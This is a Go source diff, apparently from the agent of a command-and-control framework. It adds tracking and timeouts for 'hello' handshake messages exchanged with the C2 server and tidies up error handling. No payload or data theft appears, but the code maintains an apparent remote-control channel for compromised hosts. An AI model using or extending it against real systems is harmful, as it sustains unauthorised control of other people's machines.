@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"context"
 	"encoding/json"
-	"errors"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -115,6 +114,9 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 	return
 }
 
+// HandShakes record each hello message and C2's reply
+var HandShakes = make(map[string]bool)
+
 // CCMsgTun use the connection (CCConn)
 func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 	var (
@@ -145,6 +147,15 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 			}
 			payload := msg.Payload
 			if strings.HasPrefix(payload, "hello") {
+				log.Printf("Hello (%s) received", payload)
+				// mark the hello as success
+				for hello := range HandShakes {
+					if strings.HasPrefix(payload, hello) {
+						log.Printf("Hello (%s) acknowledged", payload)
+						HandShakes[hello] = true
+						break
+					}
+				}
 				continue
 			}
 
@@ -153,6 +164,23 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		}
 		log.Println("Check CC response: exited")
 	}()
+
+	wait_hello := func(hello string) bool {
+		// delete key, forget about this hello when we are done
+		defer delete(HandShakes, hello)
+
+		// wait until timeout or success
+		for i := 0; i < RuntimeConfig.Timeout; i++ {
+			// if hello marked as success, return true
+			if HandShakes[hello] {
+				log.Printf("Hello (%s) done", hello)
+				return true
+			}
+			time.Sleep(time.Millisecond)
+		}
+		log.Printf("Hello (%s) timeout", hello)
+		return false
+	}
 
 	sendHello := func(cnt int) bool {
 		// try cnt times then exit
@@ -168,12 +196,18 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 				util.TakeABlink()
 				continue
 			}
+			HandShakes[msg.Payload] = false
+			log.Printf("Hello (%s) sent", msg.Payload)
+			if !wait_hello(msg.Payload) {
+				cancel()
+				break
+			}
 			return true
 		}
 		return false
 	}
 
-	// send hello every second
+	// keep connected
 	for ctx.Err() == nil {
 		if !sendHello(util.RandInt(1, 10)) {
 			log.Print("sendHello failed")
@@ -186,13 +220,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 		util.TakeASnap()
 	}
 
-	if err == nil {
-		err = errors.New("CC disconnected")
-	}
-	if ctx.Err() != nil {
-		err = fmt.Errorf("ctx: %v\nerr: %v", ctx.Err(), err)
-	}
-	return err
+	return fmt.Errorf("CCMsgTun closed: %v", ctx.Err())
 }
 
 // set C2Transport
